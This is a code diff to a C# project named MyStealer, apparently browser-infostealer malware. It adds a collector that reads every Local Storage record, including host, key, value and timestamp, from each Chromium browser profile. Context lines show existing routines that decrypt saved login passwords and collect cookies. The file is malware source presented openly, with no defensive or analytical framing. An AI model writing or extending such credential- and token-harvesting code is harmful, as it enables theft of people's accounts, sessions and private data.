@@ -5,6 +5,7 @@ using System;
 using System.Collections.Generic;
 using System.Data.SQLite;
 using System.IO;
+using System.Linq;
 using System.Text;
 
 namespace MyStealer.Collectors.Browser
@@ -56,6 +57,18 @@ namespace MyStealer.Collectors.Browser
             return set;
         }
 
+        public ISet<LocalStorageEntry> GetLocalStorageEntries()
+        {
+            var set = new HashSet<LocalStorageEntry>();
+            foreach (var profileName in profileNameList)
+            {
+                foreach (var entry in ReadLocalStorage(profileName, Path.Combine(UserDataPath, profileName, "Local Storage", "leveldb")))
+                    set.Add(entry);
+            }
+
+            return set;
+        }
+
         public ISet<CredentialEntry> DecryptLoginData(string profileName, string loginDataPath)
         {
             var creds = new HashSet<CredentialEntry>();
@@ -85,7 +98,6 @@ namespace MyStealer.Collectors.Browser
                         {
                             var host = reader.GetString(0);
                             var username = reader.GetString(1);
-                            var passwordEncrypted = reader.GetString(2);
                             var bufferSize = (int)reader.GetBytes(2, 0, null, 0, 0);
                             var buffer = new byte[bufferSize];
                             reader.GetBytes(2, 0, buffer, 0, bufferSize);
@@ -213,5 +225,33 @@ namespace MyStealer.Collectors.Browser
 
             return cookies;
         }
+
+        public ISet<LocalStorageEntry> ReadLocalStorage(string profileName, string levelDbPath)
+        {
+            var set = new HashSet<LocalStorageEntry>();
+            var localStorageDb = new CclChromiumLocalStorage.LocalStoreDb(levelDbPath);
+
+            foreach (var record in localStorageDb.iter_all_records())
+            {
+                var batch = localStorageDb.find_batch(record.leveldb_seq_number);
+                var timeStamp = DateTime.MinValue;
+                if (batch != null)
+                    timeStamp = batch.timestamp;
+
+                set.Add(new LocalStorageEntry
+                {
+                    ApplicationName = ApplicationName,
+                    ApplicationProfileName = profileName,
+                    Host = record.storage_key,
+                    Key = record.script_key,
+                    Value = record.value,
+                    AccessTimeStamp = timeStamp
+                });
+            }
+
+            return set;
+        }
+
+        public void Dispose() { }
     }
 }
